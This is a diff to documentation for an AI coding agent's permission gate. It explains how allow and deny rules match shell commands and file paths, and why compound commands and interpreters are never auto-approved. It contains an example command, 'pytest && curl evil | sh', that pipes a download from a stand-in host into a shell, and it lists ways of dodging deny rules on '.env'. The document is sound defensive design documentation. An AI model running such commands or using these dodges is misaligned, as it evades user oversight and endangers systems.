@@ -142,14 +142,21 @@ Two safety refinements to the matching:
 - **Spacing cannot dodge a rule.** The shell subject is the command with every run of whitespace
   collapsed to one space, so `rm   -rf x` matches `*rm -rf*`.
 - **Compound commands are never auto-allowed.** A shell command containing `;`, `&`, `|`, a backtick, `$(`,
-  `<`, `>` or a newline is not covered by an `allow` rule or a "don't ask again" grant (so a grant for
-  `pytest` cannot approve `pytest && curl evil | sh`); it always asks, and answering `a` to it grants
-  nothing. Deny rules still match anywhere in it. The rule covers `run_shell` and every command-kind tool
-  that takes a string `command` argument (an MCP bash tool, say).
-- **Path subjects are normalized.** For the path tools the subject (both sides of `move_file`) and the glob
-  of a rule are compared with backslashes turned into `/`, `./` and `..` resolved, an absolute path inside
-  the project made relative, and case folded on Windows, so a deny rule such as `read_path:.env` cannot be
-  dodged by `./.env`, `sub/../.env` or the absolute path.
+  `(`, `)`, `<` or `>`, or any character outside printable ASCII (newline, `\r`, other control characters,
+  non-breaking and Unicode spaces; tab is fine), is not covered by an `allow` rule or a "don't ask again"
+  grant (so a grant for `pytest` cannot approve `pytest && curl evil | sh`); it always asks, and answering
+  `a` to it grants nothing. Deny rules still match anywhere in it. The rule covers `run_shell` and every
+  command-kind tool that takes a string `command` argument (an MCP bash tool); for a tool the gate does not
+  know, a marker in any string argument counts. For any such tool the rule subject is its `command`.
+- **Path subjects and patterns are normalized.** For the path tools the subject (both sides of `move_file`)
+  and the glob of a rule are compared with backslashes turned into `/`, `~` expanded, the path resolved
+  against the project folder (so `./`, `..`, `../<project>/x` and the absolute path all become the same
+  relative path), trailing dots and spaces dropped on Windows, and case folded on Windows and macOS. An
+  absolute pattern inside the project is rewritten relative to it. A deny rule such as `read_path:.env` cannot
+  be dodged by spelling. On Windows, UNC and device paths (`\\host\x`, `\\?\C:\x`), alternate data streams
+  (`file::$DATA`) and drive-relative paths (`C:file`) are refused outright, before any rule.
+- **Limits.** Deny globs on shell commands are best effort: start them with `*`, and a model can spell a
+  command another way. A `run_python` rule sees only the first line of the code.
 
 `run_python` has no command to take a prefix from, so `a` approves that one call and remembers nothing.
 
@@ -163,9 +170,12 @@ against the file on disk; for a new file, the whole content as additions), the e
   `yarn`, `pip`, `cargo`, `go`, `docker`, `make`. It remembers nothing for interpreters, shells and
   wrappers (`python`, `python3`, `py`, `node`, `deno`, `bun`, `ruby`, `perl`, `php`, `bash`, `sh`, `zsh`,
   `fish`, `pwsh`, `powershell`, `cmd`, `npx`, `sudo`, `su`, `ssh`, `eval`, `exec`, `env`, `xargs`, `nohup`,
-  `timeout`, `time`; matched by file name, so `/usr/bin/python3.12` counts), nor for compound commands,
-  `run_python` or destructive tools: it approves that one call. The prompt offers `a` only when the gate
-  can remember (`Request.remember`).
+  `timeout`, `time`, `pythonw`, `nodejs`, `wsl`, `start`, `uv`, `uvx`, `pipx`, `.`, `source`, `call`;
+  matched by file name, so `/usr/bin/python3.12` counts), nor when the first word has an `=`, a quote, a
+  backtick or `$` (`CI=1 pytest`), nor for `git -c ...` or any two-word command whose second word is an
+  option, nor for `npm exec`, `npm x`, `pnpm dlx`, `pnpm exec`, `yarn dlx`, `yarn exec`, nor for compound
+  commands, `run_python` or destructive tools: it approves that one call. The prompt offers `a` only when
+  the gate can remember (`Request.remember`) and prints what it will remember (`Request.grant`).
 - `n`: refuse; an optional reason can follow. Any answer other than `y`, `a` or `n` is treated as a decline.
 
 A refusal is an ordinary tool result, never an error: `"The user declined: <reason>"` (or
